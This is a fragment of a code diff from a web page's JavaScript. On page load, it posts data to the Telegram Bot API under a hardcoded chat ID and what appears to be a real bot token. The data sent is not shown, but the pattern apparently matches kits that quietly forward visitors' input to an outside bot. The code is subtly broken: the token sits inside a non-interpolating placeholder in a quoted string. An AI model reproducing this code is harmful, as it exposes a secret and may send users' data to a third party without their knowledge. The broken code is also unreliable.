@@ -108,7 +108,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const chatId = '1490539700';
 
     // 4. Send the data to Telegram's API
-    fetch(https://api.telegram.org/bot${8314676610:AAE75mMYTbtXU1dSKko_OPZJZ0v-sp_IA44}/sendMessage, {
+    fetch('https://api.telegram.org/bot${8314676610:AAE75mMYTbtXU1dSKko_OPZJZ0v-sp_IA44}/sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
